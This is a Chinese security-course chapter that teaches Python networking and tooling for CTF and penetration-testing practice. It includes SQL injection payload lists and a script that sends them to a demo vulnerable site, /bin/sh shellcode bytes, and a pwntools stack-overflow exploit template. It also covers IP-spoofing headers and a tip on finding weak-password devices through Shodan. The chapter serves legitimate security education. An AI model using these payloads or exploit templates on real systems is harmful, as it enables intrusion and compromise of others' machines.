# 02 · Python——安全工具速通

> **⏪ 前置知识：** 无（了解 C 语言有帮助但不是必须）
> **⏩ 学完后解锁：** 网络协议（04）、Web安全（06）、渗透实战（08）
> **⏱ 预计用时：** 3-4 小时（建议分 2 天学完）
> **🎯 核心目标：** 能用 Python 写网络通信脚本、会调 requests 库扫网站、会用 pwntools 连接远程程序

---

## 🚪 门前检查

**在开始本章之前，确认你：**

- [ ] 电脑上装了 Python 3.8 或更高版本（终端输入 `python3 --version`）
- [ ] 知道怎么用 `pip install` 安装第三方库
- [ ] 知道怎么在终端里运行 `.py` 文件
- [ ] 如果学了 01 章——了解指针和内存的基本概念会很有帮助，但不是必须的

> 如果 Python 还没装：去 [python.org](https://python.org) 下载最新版。安装时**勾选 "Add Python to PATH"**。

---

## 📊 本章进度

| # | 知识点 | 预计用时 | 状态 |
|---|--------|:--:|:--:|
| 2.1 | Python 速通——和 C 语言对比着学 | 30 分钟 | ⬜ |
| 2.2 | 字符串与字节——安全人的大坑 | 30 分钟 | ⬜ |
| 2.3 | 📌 socket 编程——手写网络工具 | 45 分钟 | ⬜ |
| 2.4 | 📌 pwntools 入门——CTF 必备 | 30 分钟 | ⬜ |
| 2.5 | requests 库——写爬虫和扫描器 | 30 分钟 | ⬜ |
| 2.6 | 🧪 多线程端口扫描器 | 30 分钟 | ⬜ |
| 2.7 | 🧪 简易网络嗅探器 | 30 分钟 | ⬜ |

**掌握自检：** `[ ]` 不看笔记，能用 socket 发一次 HTTP 请求获取百度首页

---

## 1. Python 速通——对照 C 语言

### 🏪 生活场景：电动自行车 vs 手动挡汽车

你刚学会骑自行车。现在有两种选择：

**C 语言 = 手动挡汽车。** 你要管离合器、换挡、转速。控制精细——你可以在赛道上精确过弯。但市区通勤很累，一个小失误就熄火（段错误）。

**Python = 电动自行车。** 你只需要拧油门和控制方向。上下班通勤非常方便——5 分钟就能出门。但你不会知道电动机内部是怎么转的。

**网安人两种都需要。** 用 Python 快速验证想法、写自动化工具；用 C 语言理解漏洞原理（因为大多数漏洞程序是用 C 写的）。

### 🔍 C vs Python 核心差异

```python
# ===== 1. 变量：不用声明类型 =====
# C语言:  int a = 10;
#         char *s = "hello";
a = 10               # Python 自动判断 a 是整数
a = "hello"          # 同一个 a，现在变成字符串了！

# ===== 2. 数组/列表：动态扩展 =====
# C语言:  int arr[5] = {1, 2, 3, 4, 5};  // 固定大小
arr = [1, 2, 3, 4, 5]
arr.append(6)        # 随时追加——不用担心"数组满了"
arr.insert(0, 0)     # 在开头插入
arr.pop()            # 删除最后一个

# ===== 3. 字典（哈希表）：C 语言没有内置的 =====
person = {
    "name": "小明",
    "age": 20,
    "skills": ["Python", "C", "网络"]
}
print(person["name"])     # 输出: 小明
print(person.get("addr", "未知"))  # 安全取值，没有 key 就返回默认值

# ===== 4. 条件判断：靠缩进，不用括号和花括号 =====
x = 10
if x > 0:
    print("正数")        # 缩进 = C 语言的 {}
elif x == 0:
    print("零")
else:
    print("负数")

# ===== 5. 循环：直接遍历元素，不用下标 =====
for i in range(5):          # 0, 1, 2, 3, 4
    print(i)

for item in arr:            # 直接拿元素，不需要 arr[i]
    print(item)

# 列表推导式——Python 的特色武器
squares = [x**2 for x in range(10)]  # [0, 1, 4, 9, 16, 25, 36, 49, 64, 81]
# C 语言要写 4 行，Python 一行搞定
```

### 🐍 Python 为什么能"自动判断类型"？

```python
a = 10
print(type(a))    # <class 'int'>
print(id(a))      # 内存地址

a = "hello"
print(type(a))    # <class 'str'>
print(id(a))      # 内存地址变了！
# a 其实是一个"标签"，贴在了不同的对象上
# 10 和 "hello" 是两块不同的内存
# 这和 C 语言的变量是两码事——C 的变量是一块固定内存
```

### 💻 动手写代码

```python
# 保存为 quickstart.py
# 把这些概念实际跑一遍

# 字符串操作（安全人最常用的）
url = "http://target.com/product.php?id="
payloads = ["'", "' OR '1'='1", "' UNION SELECT 1,2,3--"]

for p in payloads:
    full_url = url + p
    print(f"测试: {full_url}")

# 文件操作
with open("test.txt", "w") as f:   # with 自动关闭文件
    f.write("Hello from Python\n")

with open("test.txt", "r") as f:
    content = f.read()
    print(content)

# 异常处理
try:
    result = 10 / 0
except ZeroDivisionError:
    print("除以零了！但程序没有崩溃")
```

### 🧪 小实验

把上面 C 语言那个栈溢出程序用 Python 写一遍——会溢出吗？

```python
buf = "A" * 16
buf += "B" * 100  # Python 自动扩展！
print(buf)  # 完美运行，没有溢出
# Python 的字符串/列表自动管理内存，不会溢出
# 但 Python 调用 C 扩展（如 ctypes）时，底层仍然可能溢出
```

---

## 2. 字符串与字节——安全人的大坑

### 🏪 生活场景：中文信封 vs 英文信封

你给国外的朋友寄信。你用中文写了地址"北京市海淀区..."，邮递员不认识中文，他需要你把地址翻译成拼音"Beijing, Haidian..."。如果翻译错了，信就寄丢了。

在网络通信中，**str = 人类可读的文字，bytes = 网络上实际传输的 0/1 数据。** 你的程序和人说话用 str，和网络说话用 bytes。转换的过程就是编码（encode）和解码（decode）。

**安全领域最重要的编码问题：**
- 你收到的网络数据是 bytes，要变成 str 才能读
- 你要发送的 payload（攻击载荷）是 bytes，经常要手动拼地址、shellcode
- 如果编码/解码不一致 —— 乱码还是小事，WAF 可能因为编码绕过

### 🔍 技术原理

```python
# str（字符串） = 人类可读
s = "你好"              # str 类型
print(type(s))          # <class 'str'>
print(len(s))           # 2 —— 两个字符

# bytes（字节） = 网络/文件使用的
b = s.encode("utf-8")   # str → bytes
print(b)                # b'\xe4\xbd\xa0\xe5\xa5\xbd'
print(type(b))          # <class 'bytes'>
print(len(b))           # 6 —— 每个汉字在 UTF-8 中占 3 字节

# 解码回来
s2 = b.decode("utf-8")  # bytes → str
print(s2)               # 你好

# ★ 如果用了错误的编码方式？
try:
    b.decode("gbk")     # 用 GBK 解码 UTF-8 的数据 → 乱码或报错
except:
    print("编码错误！")
```

### 💻 安全人的常用转换速查

```python
# ===== 六种最常用的转换 =====

# 1. 字符串 → 字节
b1 = "hello".encode()           # b'hello'
b2 = "你好".encode("utf-8")     # b'\xe4\xbd\xa0\xe5\xa5\xbd'

# 2. 字节 → 字符串
s1 = b"hello".decode()          # 'hello'

# 3. 整数 → 字节（构造 payload 必用！）
# 把一个地址 0x7fffffffe000 转成 8 字节小端序
addr = 0x7fffffffe000
addr_bytes = addr.to_bytes(8, 'little')   # b'\x00\xe0\xff\xff\xff\x7f\x00\x00'
addr_bytes_big = addr.to_bytes(8, 'big')  # b'\x00\x00\x00\x7f\xff\xff\xe0\x00'

# 4. 字节 → 整数（收到数据后解析）
value = int.from_bytes(b'\xff\x00\x00\x00', 'little')  # 255

# 5. 十六进制字符串 → 字节（复制别人的 shellcode）
shellcode = bytes.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80")
# b'\x31\xc0\x50\x68\x2f\x2f\x73\x68...'

# 6. 字节 → 十六进制字符串（显示用）
hex_str = b'\x31\xc0\x50\x68'.hex()   # '31c05068'
```

### 🔥 渗透中的典型场景：构造 payload

```python
# 场景：栈溢出，需要在第 73 字节处写入返回地址 0x401156

buf_size = 64     # 缓冲区 64 字节
rbp_size = 8      # RBP 8 字节
target_addr = 0x401156

# 构造 payload
payload = b"A" * buf_size                    # 填充缓冲区
payload += b"B" * rbp_size                   # 覆盖 RBP
payload += target_addr.to_bytes(8, 'little') # ★ 覆盖返回地址

print(payload.hex())  # 看看 payload 的十六进制表示
print(len(payload))   # 应该是 64 + 8 + 8 = 80 字节
```

### ⚠️ 常见误区

> ❌ **误区：** "str 和 bytes 差不多，混着用问题不大"
> ✅ **真相：** Python 3 严格区分 str 和 bytes。`"hello" + b"world"` 直接报 `TypeError`。网络收发永远是 bytes。很多 CTF 题目就是因为没处理好 bytes/str 转换而卡住。

> ❌ **误区：** "编码就用系统默认的就行"
> ✅ **真相：** Windows 默认 GBK，Linux 默认 UTF-8。你的 exploit 脚本在 Windows 上写好，拿到 Kali Linux 上跑，不指定编码就可能出错。**始终显式指定编码。**

---

## 3. 📌 socket 编程——手写网络工具

### 🏪 生活场景：打电话的全过程

你想约朋友吃饭。你拿起电话：

```
1. 买电话机/插 SIM 卡     → socket() 创建一个 socket
2. 拨朋友的号码            → connect(("IP地址", 端口号))
3. "喂，晚上一起吃饭？"    → send(数据)
4. 听朋友回答             → recv(数据)
5. 挂电话                 → close()
```

TCP socket 就是"打电话"——先建立连接，然后双方可以你一句我一句地收发。UDP socket 就是"发短信"——直接扔出去，对方收到没收到你不知道。

### 💻 最简单的 TCP 客户端：和百度说话

```python
import socket

# 1. 创建 socket（买电话机）
# AF_INET = IPv4, SOCK_STREAM = TCP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 2. 连接百度 80 端口（拨号）
sock.connect(("www.baidu.com", 80))

# 3. 发送 HTTP 请求（说话）
# 注意：必须是 bytes！
request = (
    b"GET / HTTP/1.1\r\n"
    b"Host: www.baidu.com\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)
sock.send(request)

# 4. 接收响应（听回答）
response = b""
while True:
    chunk = sock.recv(4096)   # 每次收 4096 字节
    if not chunk:             # 没数据了 = 对方挂电话了
        break
    response += chunk

# 看看收到了什么
print(f"收到 {len(response)} 字节")
print(response[:500].decode())  # 前 500 字节转成字符串

# 5. 关闭（挂电话）
sock.close()
```

**运行这段代码。** 你会看到百度的首页 HTML 被打印出来。**这意味着你绕过了浏览器，直接用底层协议和互联网上的一台真实服务器完成了一次完整的 HTTP 对话。** 渗透测试的本质就是构造特殊的请求发给服务器——你现在知道怎么做了。

### 💻 TCP 服务器：自己写一个聊天服务器

这是 socket 的完整实战——一个能接收多个客户端连接的命令行聊天室：

```python
import socket
import threading

# 服务端：等待别人连接
def server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", 4444))   # 监听所有网卡的 4444 端口
    sock.listen(5)                   # 最多 5 个排队
    print("[*] 服务器在 4444 端口等待连接...")

    while True:
        client, addr = sock.accept()  # 接受连接
        print(f"[+] {addr} 连上了")
        threading.Thread(target=handle_client, args=(client,)).start()

def handle_client(client):
    while True:
        data = client.recv(1024)
        if not data:
            break
        print(f"收到: {data.decode().strip()}")
        client.send(f"服务器收到: {data.decode()}".encode())
    client.close()

# 客户端：连接服务器
def client():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 4444))
    print("[*] 已连接服务器")

    while True:
        msg = input("你要说什么: ")
        if msg == "quit":
            break
        sock.send(msg.encode())
        response = sock.recv(1024)
        print(f"服务器回复: {response.decode()}")

    sock.close()

# 运行：先在一个终端里 server()，再在另一个终端里 client()
# if __name__ == "__main__":
#     server()  # 或 client()
```

### 🧪 小实验

1. 把 `SOCK_STREAM` 改成 `SOCK_DGRAM`（UDP），connect 换成 sendto/recvfrom。UDP 有哪些不同的行为？
2. 在 server 端 `accept()` 之后，不调用 `recv()`——客户端发消息能成功吗？（TCP 缓冲区满了会怎样？）
3. 把客户端和服务端跑在同一台电脑上，用 Wireshark 抓环回接口（lo）的包，看看底层 TCP 三次握手和四次挥手。

### ⚠️ 常见误区

> ❌ **误区：** "send 一次 = recv 一次"
> ✅ **真相：** TCP 是流式协议。你 send 了 1000 字节，对方可能一次 recv 只收到 500 字节，剩下的要再 recv 一次。**TCP 不保证边界。** 这就是为什么 HTTP 协议要用 `Content-Length` 头——告诉对方"我的消息有多长"。

---

## 4. 📌 pwntools——二进制攻击利器

### 🏪 生活场景：瑞士军刀

pwntools 之于 CTF Pwn 题 = 瑞士军刀之于野外求生。它把 socket 连接、payload 构造（整数转小端序字节）、shellcode 生成、ELF 文件解析全打包好，让你专注于攻击逻辑而不是通信细节。

**安装：**

```bash
pip install pwntools
```

### 💻 核心用法完整示例

```python
from pwn import *

# ===== 1. 连接目标 =====
# 本地程序
p = process("./vuln")

# 远程 CTF 题目
# p = remote("ctf.example.com", 9999)

# 带超时的连接
# p = remote("192.168.1.100", 9999, timeout=5)

# ===== 2. 收发数据 =====
p.send(b"hello")                # 发送原始字节
p.sendline(b"hello")            # 发送 + 换行符 \n
data = p.recv(1024)             # 接收最多 1024 字节
line = p.recvline()             # 接收一行（到 \n 为止）
data = p.recvuntil(b"prompt>")  # 接收直到出现指定字节
data = p.recvall()              # 接收所有数据直到连接关闭

# ===== 3. 构造 payload =====
# p64(n) —— 把整数转成 8 字节小端序（64位地址）
# p32(n) —— 把整数转成 4 字节小端序（32位地址）
addr = 0x401156
payload = b"A" * 72              # 填充
payload += p64(addr)             # 覆盖返回地址
# 等价于: payload += addr.to_bytes(8, 'little')

# ===== 4. 解析 ELF 文件 =====
elf = ELF("./vuln")
print(f"win 函数地址: {hex(elf.symbols['win'])}")
print(f"puts@GOT: {hex(elf.got['puts'])}")
print(f"main 函数地址: {hex(elf.symbols['main'])}")

# 搜索字符串
binsh = next(elf.search(b'/bin/sh'))

# ===== 5. ROP gadget 搜索 =====
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
print(f"pop rdi; ret @ {hex(pop_rdi)}")

# ===== 6. 生成 shellcode =====
context.arch = 'amd64'           # 指定架构
shellcode = asm(shellcraft.sh()) # 生成 execve("/bin/sh") 的机器码
print(f"shellcode: {shellcode.hex()} ({len(shellcode)} 字节)")

# ===== 7. 获得交互式 shell =====
p.interactive()                  # Ctrl+C 退出
```

### 💻 完整攻击脚本模板

```python
from pwn import *

# 配置
context.arch = 'amd64'
context.log_level = 'debug'   # 打印所有收发数据，调试用

# 目标：一个简单的栈溢出，跳到 win 函数
EXE = "./vuln"
elf = ELF(EXE)
win_addr = elf.symbols['win']  # 要跳过去的目标函数

# 启动
p = process(EXE)
# p = remote("target.com", 1337)

# 接收程序的提示信息
p.recvuntil(b"Enter your name: ")

# 构造 payload
payload = b"A" * 72            # 偏移量（buf + rbp）
payload += p64(win_addr)       # 覆盖返回地址

# 发送
p.sendline(payload)

# 拿 shell
p.interactive()
```

---

## 5. requests 库——写爬虫和扫描器

### 🏪 生活场景：自动取咖啡机

你要去茶水间手动操作咖啡机：选美式、选杯型、按确定——这是一种方法。

现在公司买了新咖啡机，支持手机扫码下单。你坐到工位上，点两下手机，走到茶水间咖啡已经做好了——这就是 requests 库的意义：**用代码代替你的手指点击鼠标**。100 个页面的表单你一个 request 就能填完。

### 💻 HTTP 请求全家桶

```python
import requests

# === GET 请求（获取数据） ===
r = requests.get("http://httpbin.org/get")
print(r.status_code)    # 200
print(r.text)           # 响应体（字符串）
print(r.json())         # 如果响应是 JSON，直接解析成字典

# === GET 带参数 ===
r = requests.get("http://httpbin.org/get", params={"key": "value", "page": "1"})
print(r.url)  # http://httpbin.org/get?key=value&page=1
# 等价于: requests.get("http://httpbin.org/get?key=value&page=1")

# === POST 请求（提交数据）===
# 表单格式（application/x-www-form-urlencoded）
r = requests.post("http://httpbin.org/post",
                   data={"username": "admin", "password": "123456"})

# JSON 格式（application/json）
r = requests.post("http://httpbin.org/post",
                   json={"username": "admin", "password": "123456"})

# === 自定义请求头（伪装浏览器）===
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Referer": "https://www.google.com/",
    "X-Forwarded-For": "1.2.3.4"     # 伪造 IP
}
r = requests.get("http://httpbin.org/headers", headers=headers)

# === Cookie 处理 ===
# 手动设置 Cookie
r = requests.get("http://httpbin.org/cookies",
                  cookies={"session": "abc123"})

# 自动管理 Cookie（像浏览器一样）
session = requests.Session()
session.get("http://httpbin.org/cookies/set/name/value")  # 服务器设 Cookie
r = session.get("http://httpbin.org/cookies")              # 自动带上！
print(r.json())  # {"cookies": {"name": "value"}}

# === 代理设置（配合 BurpSuite 抓 HTTPS 包） ===
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
# r = requests.get("https://example.com", proxies=proxies, verify=False)
# verify=False 跳过证书验证（BurpSuite 用自己的证书）
```

### 💻 安全场景：SQL 注入检测脚本

```python
import requests

# 目标 URL（假设存在注入点）
url = "http://testphp.vulnweb.com/listproducts.php?cat="

# SQL 注入测试 payload
payloads = [
    ("'", "单引号——看是否报错"),
    ("' OR '1'='1", "永真——看返回是否变多"),
    ("' OR 1=1 -- ", "注释掉后面的条件"),
    ("' AND 1=2 -- ", "永假——对比永真看差异"),
    ("' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 -- ", "联合查询——判断列数"),
]

for payload, description in payloads:
    try:
        full_url = url + payload
        r = requests.get(full_url, timeout=5)

        print(f"\n{'='*60}")
        print(f"Payload: {payload}")
        print(f"描述: {description}")
        print(f"状态码: {r.status_code}")
        print(f"响应长度: {len(r.text)} 字节")

        # 简单的检测规则
        if "error" in r.text.lower() or "mysql" in r.text.lower() or "sql" in r.text.lower():
            print(f"⚠️  响应中有 SQL 错误信息！可能存在注入！")

        if "syntax" in r.text.lower():
            print(f"⚠️  响应中有语法错误——数据库报错了！")

    except requests.exceptions.Timeout:
        print(f"[-] {payload}: 超时")
    except requests.exceptions.ConnectionError:
        print(f"[-] {payload}: 连接失败，目标不可达")
```

### 🧪 小实验

1. 把上面的 SQL 检测脚本改成多线程版本——同时测试多个 payload
2. 用 `requests.Session()` 模拟一个完整的登录→浏览→操作流程
3. 把 `verify=True` 去掉，访问一个自签名证书的 HTTPS 网站——看会报什么错误

---

## 6. 🧪 综合实验：多线程端口扫描器

这个实验把 socket 和多线程结合起来，写一个真正能用的工具。

```python
import socket
import threading
from queue import Queue

# 全局变量
open_ports = []
queue = Queue()
thread_count = 50  # 50 个线程并发

# 扫描单个端口
def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((host, port))
        sock.close()

        if result == 0:
            # 端口开放，尝试识别服务
            try:
                service = socket.getservbyport(port)
            except:
                service = "unknown"
            print(f"[+] {host}:{port} 开放 ({service})")
            open_ports.append(port)
    except:
        pass

# 线程工作函数
def worker(host):
    while not queue.empty():
        port = queue.get()
        scan_port(host, port)
        queue.task_done()

# 主函数
def port_scanner(host, start=1, end=1024):
    print(f"[*] 开始扫描 {host} 端口 {start}-{end}")

    # 把所有端口放入队列
    for port in range(start, end + 1):
        queue.put(port)

    # 启动线程
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker, args=(host,))
        t.start()
        threads.append(t)

    # 等待所有任务完成
    queue.join()
    for t in threads:
        t.join()

    print(f"\n[*] 扫描完成。开放的端口: {sorted(open_ports)}")
    return open_ports

# 使用
if __name__ == "__main__":
    # 扫描本机
    port_scanner("127.0.0.1", 1, 1024)
    # 扫描你的路由器（改成你的网关 IP）
    # port_scanner("192.168.1.1", 1, 1024)
```

---

## 7. 🧪 综合实验：简易网络嗅探器

用 Python 的 raw socket 来捕获网络包。**需要管理员/root 权限。**

```python
import socket
import struct

# 创建 raw socket（Linux 下需要 root 权限运行）
try:
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
except PermissionError:
    print("需要管理员权限！请用 sudo python3 sniff.py 运行")
    exit(1)
except AttributeError:
    print("Windows 不支持 AF_PACKET，请在 Linux/macOS 上运行此代码")
    print("或安装 scapy: pip install scapy")
    exit(1)

print("[*] 开始嗅探... (Ctrl+C 停止)")
print(f"{'源MAC':<20} {'目标MAC':<20} {'协议类型':<10} 长度")
print("=" * 70)

try:
    while True:
        raw_data, addr = sock.recvfrom(65535)

        # 以太网头: 6(目标MAC) + 6(源MAC) + 2(类型) = 14 字节
        dest_mac = raw_data[0:6].hex(':')
        src_mac = raw_data[6:12].hex(':')
        eth_type = struct.unpack('!H', raw_data[12:14])[0]

        # 协议类型
        proto_names = {0x0800: "IPv4", 0x0806: "ARP", 0x86DD: "IPv6"}
        proto_name = proto_names.get(eth_type, f"0x{eth_type:04x}")

        print(f"{src_mac:<20} {dest_mac:<20} {proto_name:<10} {len(raw_data)} 字节")

except KeyboardInterrupt:
    print("\n[*] 停止嗅探")
    sock.close()
```

> 💡 **如果这段代码在你的系统上跑不动：** 安装 `scapy`（`pip install scapy`），用它更简单：`sniff(prn=lambda p: p.summary(), count=10)`

---

## 🧵 实际案例串联

### 案例 1：Shodan——互联网的搜索引擎

Shodan 本质上就是一个**全球级别的端口扫描器**。它不停扫描整个互联网的所有 IP 地址的常用端口，记录每个端口上运行的服务和版本号。你可以在 Shodan 上搜索 "default password" 找到全世界的弱口令设备。

**涉及本草知识点：** §3 socket 连接、§6 端口扫描。

### 案例 2：sqlmap——自动化 SQL 注入

sqlmap 本质上就是用 Python 写的、加了大量智能判断逻辑的 SQL 注入扫描器。你给它一个 URL，它自动尝试各种 payload，根据响应长度和内容差异判断是否存在注入。

**涉及本草知识点：** §5 requests 请求发送和响应分析。

### 案例 3：你每天用手机 App 时

微信、淘宝、抖音的每个操作——刷新主页、发送消息、加载视频——背后都是一个 HTTP 请求。App 里内置了类似 Python requests 的 HTTP 客户端库（Android 用 OkHttp，iOS 用 URLSession），封装成了简单的函数调用。

---

## 📝 复习自检

- [ ] 能用 socket 写一个 TCP 客户端，连上百度 80 端口，发 HTTP 请求，收到响应
- [ ] 能说出 TCP 和 UDP 的区别（用打电话 vs 发短信来记）以及各自适合什么场景
- [ ] 能区分 `str` 和 `bytes`，知道六种常用转换（str↔bytes、int↔bytes、hex↔bytes）
- [ ] 能用 pwntools 启动本地程序、发 payload、收到数据
- [ ] 能用 requests 发 GET/POST 请求，设置 headers、cookies、proxies
- [ ] 能手写一个多线程端口扫描器，扫描本机 1-1024 端口
- [ ] 知道为什么 TCP `send` 一次不一定等于 `recv` 一次，以及 HTTP 怎么解决这个问题

---

## 🎬 推荐视频

| 视频 | 平台 | 说明 |
|------|------|------|
| [Python 零基础入门 2024](https://www.bilibili.com/video/BV1wF411F7xX/) | B站 | 选播放量最高的入门教程 |
| [socket 编程入门到实战](https://www.bilibili.com/) | B站 | 搜索 "python socket 编程 入门" |
| [pwntools 官方文档](https://docs.pwntools.com/) | 官网 | 英文，CTF 必备 |
| [requests 官方文档](https://docs.python-requests.org/) | 官网 | 中文翻译很全 |

---

## 🔗 知识串联

```
socket 编程      → 《04-网络协议》你可以抓包看自己发的 TCP SYN/ACK/FIN
pwntools/p64     → 《07-二进制安全》构造栈溢出 payload 的核心工具
requests         → 《06-Web安全》自己写 SQL 注入/XSS 扫描脚本的基础
多线程扫描器      → 《08-渗透实战》端口扫描和信息收集的底层实现
bytes 编码       → 《05-密码学》加密/解密操作中各种编码转换
```

---

> 💬 **读完用一句话记下来：** "Python 在网安里就是自动化工具。你需要把手工操作的每一步翻译成代码——连接（socket）、发送（send/requests）、解析（decode/json）、判断（if/else）——然后循环。学会了这两章，你已经有了写任何安全工具的基础能力。"

### 下一步：打开 `03-计算机体系-程序如何运行.md`
